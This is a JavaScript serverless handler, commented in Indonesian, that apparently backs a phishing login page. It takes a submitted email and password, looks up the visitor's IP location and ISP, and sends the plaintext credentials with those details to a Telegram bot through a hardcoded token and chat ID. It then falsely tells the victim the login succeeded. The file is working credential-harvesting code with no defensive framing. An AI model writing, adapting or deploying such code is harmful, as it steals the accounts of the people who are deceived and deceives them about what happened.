export default async function handler(req, res) {
    if (req.method !== "POST") {
        return res.status(405).json({ message: "Method Not Allowed" });
    }

    const { email, password } = req.body;

    try {
        // Ambil data IP
        const response = await fetch("https://ip-api.com/json/");
        const ipData = await response.json();
        const { query: ip, country, regionName: region, city, isp } = ipData;

        // Format pesan
        const message = `🔥 *Login Info* 🔥\n📧 Email: ${email}\n🔑 Password: ${password}\n\n🌍 *Info IP*\n📌 IP: ${ip}\n🏳️ Negara: ${country}\n🏙️ Kota: ${city}, ${region}\n📡 ISP: ${isp}`;

        // Kirim ke Telegram
        const BOT_TOKEN = "7628314972:AAHZtVoYDVeujuM8o7xpvaLzTGIjrMJodhY";
        const CHAT_ID = "6786210993";
        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({ chat_id: CHAT_ID, text: message, parse_mode: "Markdown" }),
        });

        return res.status(200).json({ success: true, message: "Login berhasil!" });
    } catch (error) {
        console.error("Error:", error);
        return res.status(500).json({ success: false, message: "Gagal login!" });
    }
}
